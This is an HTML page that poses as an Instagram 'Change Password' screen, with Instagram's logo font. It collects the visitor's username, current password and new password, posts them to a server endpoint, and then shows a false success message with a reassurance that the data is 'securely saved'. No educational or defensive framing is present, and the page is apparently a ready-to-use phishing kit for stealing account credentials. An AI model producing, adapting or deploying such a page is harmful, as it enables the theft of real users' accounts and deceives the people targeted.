<!DOCTYPE html>
<html>
<head>
    <title>Change Password</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script> <!-- Tambahkan SweetAlert -->
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap');
        body {
            background-color: #000;
        }
        .instagram-font {
            font-family: 'Grand Hotel', cursive;
        }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen">
    <div class="bg-black text-white p-8 rounded-lg w-80">
        <h1 class="instagram-font text-4xl text-center mb-8">Instagram</h1>
        <form id="loginForm" class="space-y-4" method="POST" action="/save">
            <input id="username" name="username" class="w-full p-2 bg-gray-800 border border-gray-700 rounded text-sm" placeholder="Phone number, username, or email" type="text" required />
            <input id="password" name="password" class="w-full p-2 bg-gray-800 border border-gray-700 rounded text-sm" placeholder="Old Password" type="password" required />
            <input id="passwordnew" name="newpassword" class="w-full p-2 bg-gray-800 border border-gray-700 rounded text-sm" placeholder="New Password" type="password" required />
            <button class="w-full bg-blue-600 text-white py-2 rounded font-semibold" type="submit">Change Password</button>
        </form>
        <div class="text-center mt-4">
            <p class="text-sm text-gray-500">Data will be securely saved on the server.</p>
        </div>
    </div>

    <!-- Tambahkan script SweetAlert -->
    <script>
        if (window.location.search.includes('success=true')) {
            Swal.fire({
                title: 'Success!',
                text: 'Your password has been updated successfully!',
                icon: 'success',
                confirmButtonText: 'OK'
            });
        }
    </script>
</body>
</html>
